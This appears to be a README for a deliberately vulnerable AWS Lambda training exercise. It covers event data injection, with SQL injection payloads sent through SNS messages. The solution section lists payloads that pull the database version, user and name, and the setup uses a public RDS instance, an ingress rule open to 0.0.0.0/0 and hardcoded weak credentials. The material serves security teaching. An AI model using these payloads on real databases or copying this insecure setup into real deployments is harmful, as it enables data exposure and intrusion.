## Function Event Data Injection - SQL Injection

In this damn vulnerable function, you will perform a SQL Injection attack through a SNS Notification Event.

While the attack vector is SQL Injection, the attack is typically called `Event Data Injection`, where vulnerabilities in a function are triggered by events from sources like:
* SNS Notifications
* Queue Message Notification
* S3 Event Notifications, etc

In this example, a sensor which is simulated by [payload_generator.py](mqtt_rds_sql_event_injection/payload_generator.py)
publishes messages to our Lambda Function. The function, collects this reading and stores this info in a Database.

The message is published as a JSON message with the `reading` key. Example: `{"reading": "40.0"}`
The reading is captured by the Lambda function and stored in a MySQL Database

Our objective is to exploit this event by triggering a vulnerability in the Lambda Function, in this case, a SQL Injection flaw

### Setup - Database
* Create an RDS Database instance in your AWS Account
```
    aws rds create-db-instance \
        --db-instance-identifier SensorDB \
        --db-instance-class db.t2.micro \
        --engine MySQL \
        --port 3306 \
        --allocated-storage 20 \
        --db-name sensordb \
        --master-username test \
        --master-user-password test123 \
        --db-subnet-group-name some-db-subnet \
        --publicly-accessible
```
**Sometimes you will need to create two subnets in different AZs and allocate them to the RDS Subnet group prior to this, for this to work**

* Get Security Group IDs

        aws rds describe-db-instances | jq ".DBInstances[].VpcSecurityGroups[].VpcSecurityGroupId"

* Add inbound rule to the security group

        aws ec2 authorize-security-group-ingress --group-id <group-id> --protocol all --port 3006 --cidr 0.0.0.0/0

* Get Database instance ID

        aws rds describe-db-instances | jq ".DBInstances[0].Endpoint.Address"

* Use MySQL Client (CLI) or some GUI to create the required tables, etc.

```
mysql -h <instance id> -P 3306 -u test -ptest123
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 14
Server version: 5.6.40-log Source distribution

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use sensordb
Database changed
mysql> CREATE TABLE sensor_temperature(id int NOT NULL AUTO_INCREMENT, sensor_name VARCHAR(100), temperature VARCHAR(200), PRIMARY KEY(id));
Query OK, 0 rows affected (0.60 sec)
```

* Generate a SNS Topic with `aws sns create-topic --name my-topic`

    ```
    {
        "ResponseMetadata": {
            "RequestId": "1469e8d7-1642-564e-b85d-a19b4b341f83"
        },
        "TopicArn": "arn:aws:sns:us-west-2:0123456789012:my-topic"
    }
    ```

### Setup - Lambda Function
* Goto `mqtt_rds_sql_event_injection\sqli\.chalice`
* You have been given a `config-sample.json`, which gives you the structure for the `config.json`
* Edit `config.json` to include the following:

```
"environment_variables": {
        "DB_HOST": "<instance id>",
        "DB_USER": "test",
        "DB_PASS": "test123",
        "DB_DB": "sensordb"
        "SNS_TOPIC": "<topic ARN>"
}
```
This will inject the required ENVVARs into the Lambda function at runtime

* go back to the `sqli` directory and run `chalice deploy`

### Solution

This is a slightly unconventional SQL Injection attack, in that, its triggered on an INSERT statement.

The SQLi can be triggered by tampering with the "reading" from the "sensor", you can trigger a SQL Injection attack on the INSERT Statement.

You can leverage mysql functions, global variables, etc for the attack

In the [payload_generator.py](mqtt_rds_sql_event_injection/payload_generator.py) file, you can change the reading with different SQL Injection payloads, like:
* `(SELECT @@datadir)`
* `(SELECT user())`
* `(SELECT CURRENT_USER())`
* `(SELECT DATABASE())`
* `(SELECT @@version)`
* `(SELECT ENCRYPT('password'))`

These will send SNS messages with the SQL Injection payloads, which our vulnerable function will read, process and insert into the Database.

if you run a `select * from sensor_temperature` on your mysql database, you will see output like this:

```
mysql> select * from sensor_temperature;
+----+--------------------------------------+-------------------------------------------------+
| id | sensor_name                          | temperature                                     |
+----+--------------------------------------+-------------------------------------------------+
|  1 | b2177d1c-8d5c-4f25-aa28-fde9f798ad36 | 5.6.40-log                                      |
|  2 | 39e00bb1-1ad5-42a0-b245-3e0cfd2a73ad | master@ec2-54-85-141-53.compute-1.amazonaws.com |
|  3 | 84f306bd-25e0-4703-a2ff-26c3aa7c56d3 | sensordb                                        |
|  4 | 854673c2-cff0-42ee-aa81-84a2b7203b59 | 6kPgJ56CFBaq6                                   |
+----+--------------------------------------+-------------------------------------------------+
4 rows in set (0.40 sec)
```